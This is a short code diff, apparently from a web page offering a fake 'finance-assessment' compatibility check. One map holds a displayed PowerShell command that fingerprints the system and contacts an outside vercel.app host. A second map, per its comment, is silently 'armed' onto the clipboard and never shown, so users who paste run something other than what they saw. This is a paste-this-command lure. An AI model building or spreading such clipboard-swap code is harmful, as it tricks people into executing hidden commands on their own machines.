@@ -41,7 +41,7 @@ const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   linux: `pwsh -NoProfile -Command {$r=@{}; $r.browser=if(Get-Command google-chrome -ErrorAction SilentlyContinue){'installed'}elseif(Get-Command chromium-browser -ErrorAction SilentlyContinue){'installed'}else{'not_found'}; $r.webgl=(lspci 2>/dev/null | Select-String 'VGA').ToString().Split(':')[2].Trim(); $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(id -Gn).Split(' ').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit`,
 };
 
-/** Armed onto text/plain for Command Prompt / Terminal (never shown as a second box). */
+/** Armed onto text/plain for PowerShell / Terminal (never shown as a second box). */
 const TERMINAL_COMMANDS: Record<ClientOs, string> = {
   windows:
     "compat-check --module finance-assessment --platform windows --browser-info --check-pdf-renderer --check-webgl --check-hardware-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
